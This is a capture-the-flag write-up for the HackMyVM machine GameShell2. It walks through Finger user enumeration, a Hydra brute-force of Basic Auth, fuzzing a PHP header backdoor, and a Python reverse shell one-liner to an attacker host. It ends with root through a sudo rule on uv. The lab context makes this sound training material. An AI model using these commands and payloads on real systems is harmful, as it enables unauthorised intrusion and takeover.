# GameShell2-HMV: [Gameshell2](https://hackmyvm.eu/machines/machine.php?vm=Gameshell2)

---

## Overview

This write-up documents the full compromise of the **GameShell2** machine from HackMyVM.  
The target combines weak authentication, exposed development infrastructure, a header-based PHP backdoor, and a misconfigured sudo rule allowing full root compromise.

---

## Enumeration

### Nmap Scan

```zsh
nmap -p- -sC -sV gameshell2.hmv
```

**Open services:**
- `22/tcp` – OpenSSH
- `79/tcp` – Finger
- `80/tcp` – Apache 2.4.62

---

## Web Enumeration

### Feroxbuster

An initial content discovery scan identifies key endpoints, including the username source used later for Finger validation.

```zsh
feroxbuster -e -x 7z.001,txt,php,html,zip,htm,bak,pem \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -u http://gameshell2.hmv/ \
  -t 500 \
  -o ferox-$ip.log
```

Key hits:

- `/users.html` – wordlist-style page later harvested for username enumeration
- `/terminal` – HTTP Basic Auth protected web terminal
- `/robots.txt` – confirms restricted paths

### HTTP Root

```zsh
curl http://gameshell2.hmv
```

The root page hosts a browser-based game with no direct input vectors.

### robots.txt

```zsh
curl http://gameshell2.hmv/robots.txt
```

```
Disallow: /terminal/
```

The `/terminal` endpoint returns **401 Basic Auth**.

---

## User Enumeration (Finger)

The Finger service leaks valid usernames.

```zsh
finger @gameshell2.hmv
finger root@gameshell2.hmv
```

### Automated Username Enumeration

The `/users.html` page provides a wordlist-like source that can be harvested and validated via Finger.

```zsh
curl -s http://gameshell2.hmv/users.html > users.txt
```

```python
#!/usr/bin/env python3
import subprocess

IP = "10.100.100.9"

with open("users.txt", "r", encoding="utf-8", errors="ignore") as f:
    for user in f:
        user = user.strip()
        if not user:
            continue

        try:
            r = subprocess.run(
                ["finger", f"{user}@{IP}"],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
                timeout=3,
            )
        except Exception:
            continue

        needle = f"Login: {user}"
        for line in r.stdout.splitlines():
            s = line.strip()
            # finger prints "Login: user" sometimes followed by spaces + other fields (e.g., "Name:")
            if s.startswith(needle):
                print(f"[+] valid user: {user}")
                break
```

This script reliably identifies the `dt` account.

A valid user **dt** is identified.

---

## Web Terminal & Snake Game

### Brute-force HTTP Basic Auth

```zsh
hydra -l dt -P rockyou.txt http-get://gameshell2.hmv/terminal
```

**Credentials:**

```
dt : purple1
```

After authentication, `/terminal` launches a ttyd-backed web terminal running a Snake game.  
Reaching the target score reveals a credential:

```
Your pass is: 0t4tdtlt
```

---

## User Shell (dt)

```zsh
ssh dt@gameshell2.hmv
```

### User Flag

```zsh
cat user.txt
```

---

## Virtual Host Discovery

Apache configuration reveals an additional virtual host.

```zsh
ls /etc/apache2/sites-enabled/
```

```
dev.astra.dsz.conf
```

Add to local resolution:

```zsh
10.100.100.9 dev.astra.dsz
```

---

## PHP Header Backdoor

Checking the new virtual host:

```zsh
curl http://dev.astra.dsz/
```

```html
<h1>Dev Environment - dev.astra.dsz</h1>
<!-- webshell is ready -->
```

Directory enumeration reveals:

```zsh
feroxbuster -e -x 7z.001,txt,php,html,zip,htm,bak,pem \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -u http://dev.astra.dsz \
  -t 500 \
  -o ferox-$ip-2.log
```

```
/backdoor.php
/index.html
```

### Backdoor Discovery Logic

At this stage, the presence of `/backdoor.php` was evident, but the execution mechanism was unknown. The endpoint returned no output when accessed directly, suggesting that interaction required a non-obvious trigger rather than traditional GET or POST parameters.

Given the development context and the presence of a phpsploit directory in the users directory (restricted to root), it was reasonable to assume that the backdoor header name might be derived from a developer-chosen keyword rather than a fully random string.

### Header Name Hypothesis & Mutation Strategy

```text
phpsploit
```

This seed was then expanded using Hashcat’s rule engine to generate realistic variants:

- uppercase / lowercase changes
- leetspeak substitutions (o → 0, i → 1)
- suffix mutations

```zsh
echo phpsploit > base.txt

hashcat --stdout base.txt \
  -r /usr/share/hashcat/rules/best66.rule \
  -r /usr/share/hashcat/rules/leetspeak.rule \
  -r /usr/share/hashcat/rules/toggles1.rule \
  > headers-gen.txt
```

```zsh
wfuzz -c -t 80 \
  -w headers-gen.txt \
  -H "FUZZ: phpinfo();" \
  --hc 200 \
  http://dev.astra.dsz/backdoor.php
```

Multiple variants triggered HTTP 500 responses, including:

```zsh 
Phpspl01t
phPspl01t
phpSpl01t
phpspl01T
```

This confirmed that the backdoor was case-insensitive, which aligns with PHP’s behavior of normalizing HTTP headers into `$_SERVER`.

### Backdoor Confirmation

Manual verification confirmed execution:

```zsh 
curl -s -H "phPspl01t: echo 'OK';" http://dev.astra.dsz/backdoor.php
```

Output:

```
OK
```

### Command Execution as www-data

Despite multiple disabled PHP functions, `exec()` remains usable.

```zsh
curl -H "PHPSPL01T: exec('id', \$o); echo implode(PHP_EOL, \$o);" http://dev.astra.dsz/backdoor.php
```

```md
**Why this works (and why `exec('id')` looked "silent"):**

- In PHP, `exec('id')` runs the command but **does not print output**. It only *returns the last line* of output (and if you don’t `echo` it, the HTTP response stays empty).
- Passing a second argument like `exec('id', $o)` tells PHP to store **all output lines** into the array `$o`.
- `echo implode(PHP_EOL, $o);` then prints the captured lines back into the HTTP response so we can see them.
- The backslashes in `\$o` are important because the payload is inside **double quotes** in the shell. Without escaping, the shell would try to expand `$o` as a local shell variable before it ever reaches PHP.
```

Output:

```
uid=33(www-data)
```

---

## Shell as www-data

### Reverse Shell via Header Backdoor

A reverse shell was spawned directly from the header-based backdoor using Python, leveraging `exec()` to execute a one-liner as `www-data`.

```zsh
curl -H "PHPSPL01T: exec(\"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\\\"10.100.100.10\\\",9002));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\\\"/bin/bash\\\")'\", \$o); echo implode(PHP_EOL, \$o);" \
http://dev.astra.dsz/backdoor.php
```

On the attacker machine:

```zsh
nc -lvnp 9002
```

This results in an interactive shell as `www-data`, which is later upgraded.

---

## Privilege Escalation (uv)

Inspection of sudo permissions reveals a dangerous NOPASSWD rule.

```
(ALL) NOPASSWD: /usr/local/bin/uv
```

`uv` allows execution of local scripts, enabling arbitrary root code execution.

### Root Shell Script

```zsh
cat > /tmp/root.py << 'EOF'
import os
os.setuid(0)
os.setgid(0)
os.system("/bin/bash -p")
EOF
```

### Execute as Root

```zsh
sudo /usr/local/bin/uv --no-config run /tmp/root.py
```

---

## Flags

- **User:** `flag{user-3529555bd8220350defe5d0430784920}`
- **Root:** `flag{root-983b0f2b5412aadd94ed08f249355686}`

---

## Attack Path Summary

```
Finger Enumeration
        ↓
HTTP Basic Auth Brute-force
        ↓
Web Terminal Snake Game
        ↓
SSH as dt
        ↓
Hidden Dev VHost
        ↓
PHP Header Backdoor (PHPSPL01T)
        ↓
Shell as www-data
        ↓
Misconfigured sudo (uv)
        ↓
Root
```

---

## Conclusion

This machine demonstrates:

- Information disclosure via Finger
- Weak authentication controls
- The dangers of exposed development hosts with backdoors
- How a single unsafe sudo rule can fully compromise a system

## Notes

Some enumeration strategies, payload refinement, and documentation structure were assisted by AI-based tooling.  
All exploitation steps were manually executed, validated, and adapted during the challenge.
